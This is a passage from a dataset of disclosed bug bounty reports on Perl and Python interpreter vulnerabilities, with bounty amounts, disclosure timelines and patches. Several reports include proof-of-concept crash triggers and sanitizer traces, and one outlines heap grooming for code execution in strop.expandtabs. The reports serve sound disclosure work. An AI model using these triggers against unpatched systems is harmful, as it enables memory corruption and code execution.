36  Addressable:           00
37  Partially addressable: 01 02 03 04 05 06 07
38  Heap left redzone:       fa
39  Heap right redzone:      fb
40  Freed heap region:       fd
41  Stack left redzone:      f1
42  Stack mid redzone:       f2
43  Stack right redzone:     f3
44  Stack partial redzone:   f4
45  Stack after return:      f5
46  Stack use after scope:   f8
47  Global redzone:          f9
48  Global init order:       f6
49  Poisoned by user:        f7
50  Container overflow:      fc
51  Array cookie:            ac
52  Intra object redzone:    bb
53  ASan internal:           fe
54  Left alloca redzone:     ca
55  Right alloca redzone:    cb
56==2895==ABORTING
Impact
A program that accepts a large pack count may misallocate a buffer due to an integer overflow. If an attacker can also supply pack data this may result in a heap buffer write overflow with data controlled by the attacker.",https://hackerone.com/reports/354650,No value,No value,No value,2018,5,20,14,35
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Medium,6.5,Heap Overflow,[CVE-2020-10543] Buffer overflow caused by a crafted regular expression,"tmnt53  submitted a report to Internet Bug Bounty.Jun 1st (2 years ago)CVE ID: CVE-2020-10543
See:

https://metacpan.org/pod/release/XSAWYERX/perl-5.30.3/pod/perldelta.pod
https://metacpan.org/pod/release/XSAWYERX/perl-5.28.3/pod/perldelta.pod

Impact
Potential RCE",https://hackerone.com/reports/888986,No value,No value,No value,2020,6,1,23,58
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",High,7.0,Heap Overflow,CVE-2018-6797:  A crafted regular expression can cause a heap buffer write overflow in Perl 5 giving a remote attacker control over bytes written,"geeknik  submitted a report to Internet Bug Bounty.Apr 14th (5 years ago)An attacker supplies a regular expression containing one or more \xDF characters after an escape putting the regexp into unicode matching mode, such as a \N{} escape.  Each \xDF character adds one byte of overflow, and any other text in the regular expression is written in order, providing the attacker control over the bytes written to the overflowed region.

Reported to the Perl security mailing list on 6 Oct 2017.
Confirmed as a security flaw by TonyC on 31 Jan 2018
CVE-2018-6797 assigned to this flaw on 6 Feb 2018
Patch released to the security mailing list for Perl 5.24 and Perl 5.26 on 09 Feb 2018
Patch released to the security mailing list for Perl blead on 22 Feb 2018
Public security advisory released on 14 April 2018

On 31 Jan 2018 Perl dev TonyC says in an email to the Perl security mailing list that depending on the heap implementation it may be possible to perform a nastier exploit - an attacker has almost complete control over the bytes written.
Code 1.61 KiBWrap lines Copy Download1==28186==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60700000ac58 at pc 0x000000846c2d bp 0x7ffe716bc7f0 sp 0x7ffe716bc7e0
2WRITE of size 1 at 0x60700000ac58 thread T0
3    #0 0x846c2c in S_regatom /root/perl/regcomp.c:13652
4    #1 0x8587f6 in S_regpiece /root/perl/regcomp.c:11708
5    #2 0x8587f6 in S_regbranch /root/perl/regcomp.c:11633
6    #3 0x88830a in S_reg /root/perl/regcomp.c:11371
7    #4 0x8c90dc in Perl_re_op_compile /root/perl/regcomp.c:7363
8    #5 0x5297d0 in Perl_pmruntime /root/perl/op.c:5888
9    #6 0x74d853 in Perl_yyparse /root/perl/perly.y:1210
10    #7 0x58b9b8 in S_parse_body /root/perl/perl.c:2450
11    #8 0x593622 in perl_parse /root/perl/perl.c:1753
12    #9 0x42eb7d in main /root/perl/perlmain.c:121
13    #10 0x7fba4cebe82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
14    #11 0x42fe18 in _start (/root/perl/perl+0x42fe18)
15
160x60700000ac58 is located 0 bytes to the right of 72-byte region [0x60700000ac10,0x60700000ac58)
17allocated by thread T0 here:
18    #0 0x7fba4dc62602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
19    #1 0x92dfd4 in Perl_safesysmalloc /root/perl/util.c:153
20    #2 0x8c6cbe in Perl_re_op_compile /root/perl/regcomp.c:7209
21    #3 0x5297d0 in Perl_pmruntime /root/perl/op.c:5888
22    #4 0x74d853 in Perl_yyparse /root/perl/perly.y:1210
23    #5 0x58b9b8 in S_parse_body /root/perl/perl.c:2450
24    #6 0x593622 in perl_parse /root/perl/perl.c:1753
25    #7 0x42eb7d in main /root/perl/perlmain.c:121
26    #8 0x7fba4cebe82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
27
28SUMMARY: AddressSanitizer: heap-buffer-overflow /root/perl/regcomp.c:13652 S_regatom
Impact
Depending on the heap implementation a remote attacker could have complete control over the bytes written to memory.",https://hackerone.com/reports/337986,No value,No value,No value,2018,4,14,17,22
Internet Bug Bounty,1-10,1.0,No value,$500.00,Low,2.0,Heap Overflow,heap-buffer-overflow (READ of size 61) in Perl_re_intuit_start(),"geeknik  submitted a report to Internet Bug Bounty.May 31st (5 years ago)Reported to the Perl security mailing list on 25 August 2016.
Code 1.11 KiBWrap lines Copy Download1==17057==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60800000b978 at pc 0x0000004a9201 bp 0x7ffe97551890 sp 0x7ffe97551048
2READ of size 61 at 0x60800000b978 thread T0
3    #0 0x4a9200 in __interceptor_memcmp (/root/perl/perl+0x4a9200)
4    #1 0xb46135 in Perl_re_intuit_start /root/perl/regexec.c:809:37
5    #2 0xb3a3e5 in Perl_regexec_flags /root/perl/regexec.c:2988:6
6    #3 0x8be7f9 in Perl_pp_match /root/perl/pp_hot.c:1836:10
7    #4 0x7f1dd3 in Perl_runops_debug /root/perl/dump.c:2234:23
8    #5 0x5a1234 in S_run_body /root/perl/perl.c:2525:2
9    #6 0x5a1234 in perl_run /root/perl/perl.c:2448
10    #7 0x4de85d in main /root/perl/perlmain.c:123:9
11    #8 0x7f8899228b44 in __libc_start_main /build/glibc-uPj9cH/glibc-2.19/csu/libc-start.c:287
12    #9 0x4de4cc in _start (/root/perl/perl+0x4de4cc)
13
140x60800000b978 is located 0 bytes to the right of 88-byte region [0x60800000b920,0x60800000b978)
15allocated by thread T0 here:
16    #0 0x4c113e in realloc (/root/perl/perl+0x4c113e)
17    #1 0x7f6306 in Perl_safesysrealloc /root/perl/util.c:274:18
18
19SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 __interceptor_memcmp
What is happening?##
Code 374 BytesWrap lines Copy Download1When a match is anchored against the start of a string, the regexp can be compiled to include a fixed string match against a fixed offset in the string. In some cases, where the matched against string included UTF-8 before the fixed offset, this could result in attempting a memcmp() which overlaps the end of the string and potentially past the end of the allocated memory.
Arguments for:##
On 29 August 2016, Tony says It *might* be possible to use this as a hard to trigger denial of service attack, eg. if the memcmp() went past the end of a page into unmapped memory.
On the same day in another comment, Tony says An attacker that can control the regexp *might* be able to use that to examine the contents of memory beyond the terminating NUL, which would be critical if that previously held a password or anything else sensitive.
Arguments Against:##
On 6 September 2016, Dave says I don't think this is a security issue any more, and I think your patch should be applied.
Fix##
Patch was released on 30 October 2016 and it was released today, 30 May 2017, with Perl 5.26.0. (Worth noting that 52 of the bug fixes in Perl 5.26.0 were from my reports).arice HackerOne staff  updated the severity from medium to low. Jun 5th (5 years ago)Internet Bug Bounty  rewarded geeknik with a $500 bounty. Jun 5th (5 years ago)arice HackerOne staff  closed the report and changed the status to Resolved. Jun 5th (5 years ago)geeknik   requested to disclose this report. Jun 5th (5 years ago)arice HackerOne staff  agreed to disclose this report. Jun 5th (5 years ago)  This report has been disclosed. Jun 5th (5 years ago)",https://hackerone.com/reports/233440,No value,No value,No value,2017,5,31,0,7
Internet Bug Bounty,1-10,1.0,No value,$500.00,Low,2.0,Heap Overflow,heap-buffer-overflow (READ of size 11) in Perl 5.25.x,"geeknik  submitted a report to Internet Bug Bounty.May 26th (5 years ago)This issue was first reported to the Perl security mailing list on 19 August 2016. It was inadvertently made public in another bug report on 23 August 2016. It was finally marked fixed around 23 January 2017. 
Original bug report:
Code 1.41 KiBWrap lines Copy Download1perl -e 'v300&O|0' triggers a heap-buffer-overflow in Perl_my_atof2 (numeric.c:1349). This was found with AFL, ASAN and libdislocator.so and affects v5.25.4 (v5.25.3-305-g8c6b0c7). Perl 5.20.2 returns errors, doesn't crash.
2
3==23567==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000e1ba at pc 0x0000004abd02 bp 0x7ffced70a210 sp 0x7ffced7099d0
4READ of size 11 at 0x60200000e1ba thread T0
5    #0 0x4abd01 in __interceptor_strlen (/root/perl/perl+0x4abd01)
6    #1 0xc2edf7 in Perl_my_atof2 /root/perl/numeric.c:1349:28
7    #2 0xc2e7a5 in Perl_my_atof /root/perl/numeric.c:1244:13
8    #3 0x99bbfc in S_sv_setnv /root/perl/sv.c:2113:9
9    #4 0x8fd5fe in S_sv_2iuv_common /root/perl/sv.c:2298:13
10    #5 0x900fd5 in Perl_sv_2uv_flags /root/perl/sv.c:2574:6
11    #6 0x9c7738 in Perl_pp_bit_or /root/perl/pp.c:2463:35
12    #7 0x7f1d93 in Perl_runops_debug /root/perl/dump.c:2234:23
13    #8 0x5a11d6 in S_run_body /root/perl/perl.c:2524:2
14    #9 0x5a11d6 in perl_run /root/perl/perl.c:2447
15    #10 0x4de85d in main /root/perl/perlmain.c:123:9
16    #11 0x7ff026dedb44 in __libc_start_main /build/glibc-uPj9cH/glibc-2.19/csu/libc-start.c:287
17    #12 0x4de4cc in _start (/root/perl/perl+0x4de4cc)
18
190x60200000e1ba is located 0 bytes to the right of 10-byte region [0x60200000e1b0,0x60200000e1ba)
20allocated by thread T0 here:
21    #0 0x4c0e4b in malloc (/root/perl/perl+0x4c0e4b)
22    #1 0x7f5bd7 in Perl_safesysmalloc /root/perl/util.c:153:21
Reason for the bug:
Code 294 BytesWrap lines Copy Download1The UTF-8 string path of bit-and in do_vop() doesn't NUL terminate the resulting string. The bit-or op then attempts to or the result of that and a number, so attempts to convert that result into a number and strlen() attempts to access the undefined bytes following the result of the bit-and. 
First mention of it being a security issue - 19 August 2016
... proper to treat this as a security issue. - 23 August 2016
It was eventually decided that this didn't warrant a release or CVE assignment and that the fix would just be committed and a perldelta entry created.",https://hackerone.com/reports/232150,No value,No value,No value,2017,5,26,6,38
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Medium,5.45,Heap Overflow,read outside of buffer (heap buffer overflow) in S_regmatch - regexec.c:6057,"geeknik  submitted a report to Internet Bug Bounty.Feb 21st (6 years ago)Reported to the Perl security mailing list on 20 August 2016, reported fixed by khw on 30 August 2016. 
Code 1.16 KiBWrap lines Copy Download1==14086==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61900000a4aa at pc 0x000000b9988f bp 0x7fff325d9630 sp 0x7fff325d9628
2READ of size 1 at 0x61900000a4aa thread T0
3    #0 0xb9988e in S_regmatch /root/perl/regexec.c:6057:24
4    #1 0xb691ec in S_regtry /root/perl/regexec.c:3619:14
5    #2 0xb5323c in S_find_byclass /root/perl/regexec.c:2357:9
6    #3 0xb41439 in Perl_regexec_flags /root/perl/regexec.c:3368:13
7    #4 0xa36982 in Perl_pp_substcont /root/perl/pp_ctl.c:225:18
8    #5 0x7f1b53 in Perl_runops_debug /root/perl/dump.c:2234:23
9    #6 0x5a0ff6 in S_run_body /root/perl/perl.c:2524:2
10    #7 0x5a0ff6 in perl_run /root/perl/perl.c:2447
11    #8 0x4de68d in main /root/perl/perlmain.c:123:9
12    #9 0x7fdb3ea25b44 in __libc_start_main /build/glibc-uPj9cH/glibc-2.19/csu/libc-start.c:287
13    #10 0x4de2fc in _start (/root/perl/perl+0x4de2fc)
14
150x61900000a4aa is located 2 bytes to the right of 1064-byte region [0x61900000a080,0x61900000a4a8)
16allocated by thread T0 here:
17    #0 0x4c0c7b in malloc (/root/perl/perl+0x4c0c7b)
18    #1 0x7f5997 in Perl_safesysmalloc /root/perl/util.c:153:21
19
20SUMMARY: AddressSanitizer: heap-buffer-overflow /root/perl/regexec.c:6057 S_regmatch
In some circumstances, this will just cause a crash (denial of service), in other circumstances, it could read outside of the buffer by up to 12 bytes:
Code 146 BytesWrap lines Copy Download1That means the maximum it can extend beyond the string is 12 bytes, if the character is \xFF, and a UV is a quad. Otherwise it is 6 bytes or less.
The final resting place of this bug is https://rt.perl.org/Public/Bug/Display.html?id=129024 where you can see this mentioned as a security fix for maintenance release 5.22.4/5.24.2.",https://hackerone.com/reports/207983,No value,No value,No value,2017,2,21,19,6
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,Memory Corruption - Generic,Perl 5.22 VDir::MapPathA/W Out-of-bounds Reads and Buffer Over-reads,"johnleitch  submitted a report to Internet Bug Bounty.Jan 13th (7 years ago)I have reported multiple vulnerabilities in Perl that have now been fixed.
https://rt.perl.org/Public/Bug/Display.html?id=126755

Perl 5.22 suffers from two out-of-bounds read and multiple small buffer over-read vulnerabilities in the VDir::MapPathA and VDir::MapPathW functions that could potentially be exploited to achieve arbitrary code execution. The out-of-bounds read issues exist because the functions in question do not validate that the chr argument passed to DriveIndex, which calculates an index:
    inline int DriveIndex(char chr)
{
if (chr == '\' || chr == '/')
return ('Z'-'A')+1;
return (chr | 0x20)-'a';
};
In the VDir::MapPathA function, DriveIndex is called with a potentially untrusted value, pInName,  and the return value is then passed to GetDirA:
char VDir::MapPathA(const char pInName)
{   /*


possiblities -- relative path or absolute path with or without drive letter


OR UNC name
*/
[...]
    if (pInName[1] == ':') {
[...]
}
else {
/ relative path with drive letter /
strcpy(szBuffer, GetDirA(DriveIndex(*pInName)));
strcat(szBuffer, &pInName[2]);
if(strlen(szBuffer) > MAX_PATH)
szBuffer[MAX_PATH] = '\0';
	    DoGetFullPathNameA(szBuffer, sizeof(szLocalBufferA), szLocalBufferA);
}
}
else {
[...]
}
    return szLocalBufferA;
}


GetDirA then uses the unbounded index argument to index into dirTableA, a fixed length char pointer array.
    inline const char GetDirA(int index)
{
char ptr = dirTableA[index];
if (!ptr) {
/ simulate the existence of this drive /
ptr = szLocalBufferA;
ptr[0] = 'A' + index;
ptr[1] = ':';
ptr[2] = '\';
ptr[3] = 0;
}
return ptr;
};
In cases where index is attacker controlled, this behavior can be used to read outside of the dirTableA array. This is especially problematic because the value returned is then copied to a fixed length buffer using strcpy:
strcpy(szBuffer, GetDirA(DriveIndex(*pInName)));
If an attacker can manipulate the layout of memory to trick GetDirA into returning a string larger than szBuffer, a buffer overflow will occur. The issue in VDir::MapPathW is nearly identical..
Further, multiple small and less critical buffer over-reads exist in both VDir::MapPathA and VDir::MapPathW:
char VDir::MapPathA(const char pInName)
{   /*


possiblities -- relative path or absolute path with or without drive letter


OR UNC name
*/
[...]
    if (!length) <<< Check here confirms the buffer is at least of length 2 (including null) before continuing execution.
return (char*)pInName;
    [...]
    if (pInName[1] == ':') { <<< While technically no over-read can occur here, pInName is a single character, this checks the null terminator.
/ has drive letter /
if (IsPathSep(pInName[2])) { <<<< This could cause an over-read because the string could possibly be of length 2 (including null).
/ absolute with drive letter /
DoGetFullPathNameA((char)pInName, sizeof(szLocalBufferA), szLocalBufferA);
}
else {
/ relative path with drive letter /
strcpy(szBuffer, GetDirA(DriveIndex(pInName)));
strcat(szBuffer, &pInName[2]); <<<< This could cause an over-read for the same reason.
if(strlen(szBuffer) > MAX_PATH)
szBuffer[MAX_PATH] = '\0';
	    DoGetFullPathNameA(szBuffer, sizeof(szLocalBufferA), szLocalBufferA);
}
}
else {
[...]
}
}
    return szLocalBufferA;
}


To observe the out-of-bounds read vulnerability in VDir::MapPathA, the following script can be executed while Perl is under a debugger:
print glob ""]:"";
Which will result in an exception similar to the following:
(f78.1dd8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0081d62c ebx=0081dae2 ecx=765c7377 edx=7eff3920 esi=0081dae0 edi=0081d62c
eip=747613a0 esp=0081d608 ebp=74744fac iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
MSVCR110!strcat+0x71:
747613a0 8a11            mov     dl,byte ptr [ecx]          ds:002b:765c7377=??
0:000> k
ChildEBP RetAddr
0081d608 709059ea MSVCR110!strcat+0x71
0081d940 7090688e perl523!VDir::MapPathA+0xdd
0081d94c 7090e295 perl523!PerlDirMapPathA+0x1f
0081dab4 70906736 perl523!win32_stat+0x6e
0081dac0 72541f60 perl523!PerlLIOLstat+0xd
0081dee4 7254181b Glob!g_lstat+0x72
0081df6c 725415e7 Glob!glob2+0x7a
0081efb0 72541141 Glob!glob0+0x181
0081f7cc 725420e8 Glob!bsd_glob+0x11d
0081f814 72542929 Glob!doglob+0x3f
0081f850 72542391 Glob!csh_glob+0x4a2
0081f894 708a05f4 Glob!iterate+0x1e8
0081f8ac 708cd3d8 perl523!Perl_pp_glob+0x19a
0081f8b8 70871fd8 perl523!Perl_runops_standard+0xc
0081f8cc 70871ef8 perl523!S_run_body+0xdf
0081f938 70908290 perl523!perl_run+0x1e6
0081fb68 00fe1216 perl523!RunPerl+0xbc
0081fba8 76de3744 perl!tmainCRTStartup+0xfd
0081fbbc 77b7a064 KERNEL32!BaseThreadInitThunk+0x24
0081fc04 77b7a02f ntdll!RtlUserThreadStart+0x2f
0081fc14 00000000 ntdll!_RtlUserThreadStart+0x1b
To fix the issue, it is recommended that the VDir::MapPathA and VDir::MapPathW functions validate the drive letter to ensure no out-of-bounds reads occur, and also check the length of the pInName argument to ensure no buffer over-reads occur. A proposed patch is attached. However, the patch only addresses the issues in VDir::MapPathA because it was not immediately clear how to hit VDir::MapPathW for the purpose of testing.
Credit: John Leitch (john@autosectools.com), Bryce Darling (darlingbryce@gmail.com)Internet Bug Bounty  rewarded johnleitch with a $1,000 bounty. Mar 20th (7 years ago)arice HackerOne staff  closed the report and changed the status to Resolved. Mar 20th (7 years ago)arice HackerOne staff  requested to disclose this report. Mar 20th (7 years ago)johnleitch   agreed to disclose this report. Mar 31st (7 years ago)  This report has been disclosed. Mar 31st (7 years ago)",https://hackerone.com/reports/110352,No value,No value,No value,2016,1,13,0,19
Internet Bug Bounty,1-10,1.0,No value,$500.00,Medium,6.5,Cross-site Scripting (XSS) - Reflected,A reflected XSS in python/Lib/DocXMLRPCServer.py,"longwenzhang  submitted a report to Internet Bug Bounty.Oct 1st (3 years ago)I have report this issue to PSRT and it has been resolved now.
Details about this issue is at https://bugs.python.org/issue38243 and http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16935
Impact
It's the same with other xss.nochnoidozor   updated CVE reference to CVE-2019-16935. Oct 2nd (3 years ago)nochnoidozor   changed the status to Triaged. Oct 2nd (3 years ago)Thank you @longwenzhang! I was able to validate your report, and have submitted it to the appropriate remediation team for review. Please note that the status and severity are subject to change. Internet Bug Bounty  rewarded longwenzhang with a $500 bounty. Oct 18th (3 years ago)reed   closed the report and changed the status to Resolved. Oct 18th (3 years ago)Thank you for helping keep the internet safe! Happy hacking.reed   requested to disclose this report. Oct 18th (3 years ago)longwenzhang   agreed to disclose this report. Oct 19th (3 years ago)  This report has been disclosed. Oct 19th (3 years ago)longwenzhang   posted a comment. Oct 29th (3 years ago)I have open a tool for finding xss vulnerability, It's  https://github.com/lwzSoviet/NoXss.git
Join me~",https://hackerone.com/reports/705420,No value,No value,No value,2019,10,1,14,21
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,None,array.fromstring Use After Free,johnleitch  submitted a report to Internet Bug Bounty.Jul 12th (7 years ago)http://bugs.python.org/issue24613  closed the report and changed the status to Resolved. Updated Dec 7th (7 years ago)Internet Bug Bounty  rewarded johnleitch with a $500 bounty. Dec 7th (7 years ago),https://hackerone.com/reports/104024,No value,No value,No value,2015,7,12,0,0
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,None,audioop.lin2adpcm Buffer Over-read,johnleitch  submitted a report to Internet Bug Bounty.Jun 15th (7 years ago)http://bugs.python.org/issue24457  closed the report and changed the status to Resolved. Updated Dec 7th (7 years ago)Internet Bug Bounty  rewarded johnleitch with a $500 bounty. Dec 7th (7 years ago),https://hackerone.com/reports/104020,No value,No value,No value,2015,6,15,0,0
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Medium,6.1,CRLF Injection,CRLF Injection in urllib,"push0ebp  submitted a report to Internet Bug Bounty.May 25th (3 years ago)Hi. I found CRLF Injection a few months ago.
Please refer my bug issue.
https://bugs.python.org/issue35906
Thank you
Impact
lead to SSRF.
e.g. can exploit a internal redis server to send arbitrary packet data including ascii and non-ascii.",https://hackerone.com/reports/590020,No value,No value,No value,2019,5,25,10,16
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,Cryptographic Issues - Generic,CVE-2016-0772 - python: smtplib StartTLS stripping attack,"hxd  submitted a report to Internet Bug Bounty.Jun 14th (6 years ago)python smtplib starttls stripping attack

affects: (basically all versions of smtplib with starttls support and projects relying on it)
python 2.7.2 - 2.7.11 (dates back ~14 years)
python 3.0 - 3.5.1 (dates back ~7 years)

Python's implementation of smtplib fails to raise an exception upon an unexpected response during negotiation of tls via the starttls protocol. This allows a MiTM capable of injecting smtp messages to force smtplib to silently abort tls negotiation proceeding to transmit cleartext. (impacting confidentiality)
For more details see [1]
potentially affects a variety of open source projects from Django, web2py, ...
initially reported to python PSRT (timeline see [1]) with details, PoC [2] and patch [2]. The patch was accepted and recently landed in python 2.7/3.x [3,4].
full details and the actual research material that was securely disclosed to Python PSRT will be made available at [1] (currently a preliminary vulnerability note)
the PoC striptls [2] is a generic protocol independent tls interception proxy written in python that is also capable of probing for various starttls stripping vectors in smtp, pop3, imap, ftp, xmpp, acap and irc. It is also available via pip install striptls (pretty handy for sniffing/proxying proprietary protocols based on top of implicit/explicit tls)
Vendor announcements: [5,6,7]
the preliminary vulnerability note [1] will be updated in accordance with the Python software release scheduled for June 26th.
[1] https://github.com/tintinweb/pub/tree/master/pocs/cve-2016-0772
[2] https://github.com/tintinweb/striptls
[3] https://hg.python.org/cpython/rev/d590114c2394
[4] https://hg.python.org/cpython/rev/b3ce713fb9be
[5] http://www.openwall.com/lists/oss-security/2016/06/14/9
[6] https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-0772
[7] https://access.redhat.com/security/cve/cve-2016-0772hxd   posted a comment. Jul 3rd (6 years ago)updated vulnerability note, all information is now public (+1 week after official python release)
see: https://github.com/tintinweb/pub/tree/master/pocs/cve-2016-0772arice HackerOne staff  closed the report and changed the status to Resolved. Jul 31st (6 years ago)Internet Bug Bounty  rewarded hxd with a $1,000 bounty. Jul 31st (6 years ago)arice HackerOne staff  requested to disclose this report. Jul 31st (6 years ago)  This report has been disclosed. Aug 30th (6 years ago)",https://hackerone.com/reports/144782,No value,No value,No value,2016,6,14,21,25
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,Memory Corruption - Generic,Heap corruption via Python 2.7.11 IOBase readline(),guido  submitted a report to Internet Bug Bounty.Jun 4th (6 years ago)https://bugs.python.org/issue27211,https://hackerone.com/reports/143022,No value,No value,No value,2016,6,4,9,19
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,None,hotshot pack_string Heap Buffer Overflow,johnleitch  submitted a report to Internet Bug Bounty.Jun 20th (7 years ago)http://bugs.python.org/issue24481  closed the report and changed the status to Resolved. Updated Dec 7th (7 years ago)Internet Bug Bounty  rewarded johnleitch with a $500 bounty. Dec 7th (7 years ago),https://hackerone.com/reports/104022,No value,No value,No value,2015,6,20,0,0
Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",No value,0.0,None,integer overflow in 'buffer' type allows reading memory,removed  submitted a report to Internet Bug Bounty.Jun 23rd (8 years ago)https://mail.python.org/pipermail/python-bugs-list/2014-June/244955.html,https://hackerone.com/reports/20671,No value,No value,No value,2014,6,23,9,15
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,None,Integer overflow in _json_encode_unicode leads to crash,"nilch  submitted a report to Internet Bug Bounty.Jun 27th (7 years ago)http://bugs.python.org/issue24522
Code 1.85 KiBWrap lines Copy Download1# static PyObject *
2# escape_unicode(PyObject *pystr)
3# {
4#     /* Take a PyUnicode pystr and return a new escaped PyUnicode */
5#     Py_ssize_t i;
6#     Py_ssize_t input_chars;
7#     Py_ssize_t output_size;
8#     Py_ssize_t chars;
9#     PyObject *rval;
10#     void *input;
11#     int kind;
12#     Py_UCS4 maxchar;
13# 
14#     if (PyUnicode_READY(pystr) == -1)
15#         return NULL;
16# 
17#     maxchar = PyUnicode_MAX_CHAR_VALUE(pystr);
18#     input_chars = PyUnicode_GET_LENGTH(pystr);
19#     input = PyUnicode_DATA(pystr);
20#     kind = PyUnicode_KIND(pystr);
21# 
22#     /* Compute the output size */
23#     for (i = 0, output_size = 2; i < input_chars; i++) {
24#         Py_UCS4 c = PyUnicode_READ(kind, input, i);
25#         switch (c) {
26#         case '\\': case '""': case '\b': case '\f':
27#         case '\n': case '\r': case '\t':
28#             output_size += 2;
29#             break;
30#         default:
31#             if (c <= 0x1f)
32#                 output_size += 6;
33#             else
34#                 output_size++;
35#         }
36#     }
37#
38#     rval = PyUnicode_New(output_size, maxchar);
39#
40# 1.) if c is <= 0x1f then output_size += 6. There are no overflow checks on this variable.
41# 2.) rval buffer is too small to hold results
42#
43# Crash:
44# ------
45#
46# Program received signal SIGSEGV, Segmentation fault.
47# 0xb7a2e9be in escape_unicode (pystr=pystr@entry=0x8cf81018)
48#     at /home/pail/cpython/Modules/_json.c:306
49# 306                ENCODE_OUTPUT;
50#
51# OS info
52# --------
53#  %./python -V
54#  > Python 3.6.0a0
55# % uname -a
56# Linux Pail0verflow 3.13.0-52-generic #85-Ubuntu SMP Wed Apr 29 16:44:56 UTC 2015 i686 i686 i686 GNU/Linux
57#
58# ASAN Info (details in other file)
59# =================================================================
60# ==6512== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5c00000 at pc 0xb5f17356 bp 0xbfaa0eb8 sp 0xbfaa0eac
61# WRITE of size 1 at 0xb5c00000 thread T0
import json
sp = ""\x13""*715827883 #((2**32)/6 + 1)
json.dumps([sp], ensure_ascii=False)Internet Bug Bounty  rewarded nilch with a $1,000 bounty. Jun 30th (7 years ago)  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago)",https://hackerone.com/reports/73260,No value,No value,No value,2015,6,27,0,0
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,None,Integer overflow in _pickle.c,tukan  submitted a report to Internet Bug Bounty.Jun 27th (7 years ago)https://bugs.python.org/issue24521Internet Bug Bounty  rewarded tukan with a $500 bounty. Jun 30th (7 years ago)  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago),https://hackerone.com/reports/73259,No value,No value,No value,2015,6,27,0,0
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,None,Integer overflow in _Unpickler_Read,hugbounter  submitted a report to Internet Bug Bounty.Sep 26th (7 years ago)https://hg.python.org/cpython/rev/88d98f6c2d7d  closed the report and changed the status to Resolved. Updated Dec 7th (7 years ago)Internet Bug Bounty  rewarded hugbounter with a $500 bounty. Dec 7th (7 years ago),https://hackerone.com/reports/103992,No value,No value,No value,2015,9,26,0,0
Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",No value,0.0,None,Integer overflow in strop.expandtabs,"ianbeer  submitted a report to Internet Bug Bounty.Mar 31st (9 years ago)This issue was originally disclosed directly to the Python Security Response Team
Here's a bug in a string handling function which might be reachable in some ""sandboxed python"" environments, and maybe (at a stretch) remotely if someone were to offer ""expanding-tabs-in-strings""-as-a-service...
Bug:
Modules/stropmodule.c
Code 943 BytesWrap lines Copy Download1static PyObject *
2strop_expandtabs(PyObject *self, PyObject *args)
3...
4  i = j = old_j = 0;
5  e = string + stringlen;
6  for (p = string; p < e; p++) {
7      if (*p == '\t') {
8          j += tabsize - (j%tabsize);
9          if (old_j > j) {
10              PyErr_SetString(PyExc_OverflowError,
11                              ""new string is too long"");
12              return NULL;
13          }
14          old_j = j;
15      } else {
16          j++;
17          if (*p == '\n') {
18              i += j;               <-- missing check here
19              j = 0;
20          }
21      }
22  }
23...
24  out = PyString_FromStringAndSize(NULL, i+j);
25...
26  i = 0;
27  q = PyString_AS_STRING(out);
28
29  for (p = string; p < e; p++) {
30      if (*p == '\t') {
31          j = tabsize - (i%tabsize);
32          i += j;
33          while (j-- > 0)
34              *q++ = ' ';
35      } else {
36          *q++ = *p;
37          i++;
38          if (*p == '\n')
39              i = 0;
40      }
41  }
42...
There's no check preventing i from overflowing, meaning that a string consisting of multiple tabs spread over multiple lines combined with a large tabsize can cause the allocation of an undersized string buffer.
With some simple heap manipulation the length of the copy into this buffer can be controlled, and it's pretty easy to corrupt memory in such a way as to gain native code execution:
[h1|----------][h2|\t\n\t\n....][h3|----------]
h1: PyStringObject header of undersized buffer
h2: PyStringObject header of tabstring
By grooming the heap such that this allocation pattern is achieved when the expandtabs function starts expanding the h2 string into the h1 inline buffer it will overflow into the string being expanded, overwriting the tabs in the original string with spaces so that the second loop won't expand them anymore.
By carefully crafting the string to expand and choosing the tabsize you can limit the extent of the memory corruption to chosen objects.
Getting code execution is simply a matter of pointing the ob_type field of the h2 string header to a controlled address with a fake struct _typeobject. The struct contains the following function pointers which will be called when their corresponing python function is called:
  destructor tp_dealloc;
printfunc tp_print;
getattrfunc tp_getattr;
setattrfunc tp_setattr;
cmpfunc tp_compare;
reprfunc tp_repr;
Patch:
You've actually already patched this bug in a copy-and-paste version of this function... In fact there seem to be at least three versions of expandtabs; transmogrify.h and stropmodule.c are both vulnerable; stringobject.c isn't. I'm not familiar enough with the code to know when each version will be used.
The patch is to use the stringobject.c implementation which does the overflow check correctly, but here's a quick patch (for the 2.7 branch) which will do the job:
Code 490 BytesWrap lines Copy Download1--- a/Modules/stropmodule.c Sun Mar 30 16:43:11 2014 -0400
2+++ b/Modules/stropmodule.c Mon Mar 31 00:36:57 2014 +0200
3@@ -624,6 +624,11 @@
4         } else {
5             j++;
6             if (*p == '\n') {
